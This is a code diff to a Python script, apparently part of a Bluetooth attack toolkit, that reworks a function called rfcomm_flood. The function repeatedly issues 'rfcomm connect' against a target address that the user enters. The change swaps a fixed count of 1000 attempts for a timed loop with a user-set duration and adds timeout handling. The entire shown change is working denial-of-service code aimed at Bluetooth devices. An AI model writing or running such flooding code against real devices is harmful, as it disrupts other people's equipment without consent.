@@ -29,17 +29,31 @@ def rfcomm_flood():
         print("⚠️ No address entered. Exiting RFCOMM flood.")
         return
 
-    print(f"💥 Starting RFCOMM connection flood on {addr}...")
+    try:
+        duration = int(input("💜 Enter flood duration in seconds (default 30): ") or "30")
+    except ValueError:
+        print("⚠️ Invalid input! Using default duration of 30 seconds.")
+        duration = 30  # Default duration
 
-    for i in range(1000):  # Attempt 1000 connection floods
+    print(f"💥 Starting RFCOMM connection flood on {addr} for {duration} seconds...")
+
+    start_time = time.time()
+    attempt = 0
+
+    while time.time() - start_time < duration:
         try:
-            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True, timeout=5)
-            print(f"✅ Attempt {i+1}: Connected to {addr}")
+            attempt += 1
+            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True, timeout=10)  # Increased timeout!
+            print(f"✅ Attempt {attempt}: Connected to {addr}")
+        except subprocess.TimeoutExpired:
+            print(f"⚠️ Attempt {attempt}: Connection timed out to {addr}, skipping...")
         except subprocess.CalledProcessError:
-            print(f"⚠️ Attempt {i+1}: Connection failed to {addr}")
+            print(f"⚠️ Attempt {attempt}: Connection failed to {addr}")
         except KeyboardInterrupt:
             print("⚠️ Stopped by user. Exiting RFCOMM flood.")
             break
+
+    print("✅ RFCOMM flood completed!")
 
 # 🏁 Main Function: Choose Feature
 def main():
